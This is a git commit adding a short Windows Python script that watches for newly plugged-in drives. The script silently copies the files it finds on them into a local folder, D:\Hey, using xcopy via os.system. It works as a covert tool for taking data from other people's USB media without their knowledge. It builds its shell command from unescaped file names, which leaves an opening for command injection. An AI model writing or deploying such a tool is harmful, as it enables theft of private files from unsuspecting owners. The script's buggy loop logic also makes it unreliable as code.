3720dfc9fc687f8f2d8dff36d40d7ec6b023fa32
Vishwanath Bondugula <40670894+vishwa5854@users.noreply.github.com>
2019-10-23 09:01:23 +0530

    Seems everything is fine

---
+++ lol.py
@@ -0,0 +1,27 @@
+import win32api
+import os
+import time
+
+drives = win32api.GetLogicalDriveStrings()
+drives = drives.split('\000')[:-1]
+numberOfDrives = len(drives)
+
+while True:
+	newDriveList = win32api.GetLogicalDriveStrings()
+	newDriveList = newDriveList.split('\000')[:-1]
+	newLength = len(newDriveList)
+	if newLength > numberOfDrives:
+		required = newDriveList[newLength - 1]
+		newDrive = newDriveList[-1]
+		listOfFiles = os.listdir(newDrive)
+		for fil in listOfFiles:
+			if fil == "System Volume Information":
+				continue
+			print(listOfFiles)
+			fileName = newDrive[0] + newDrive[1] + "\\"
+			fileName += fil
+			cmd = 'xcopy ' + '"' + fileName + '"' + ' "D:\\Hey"'	
+			os.system(cmd)
+			break
+	
+	time.sleep(5)
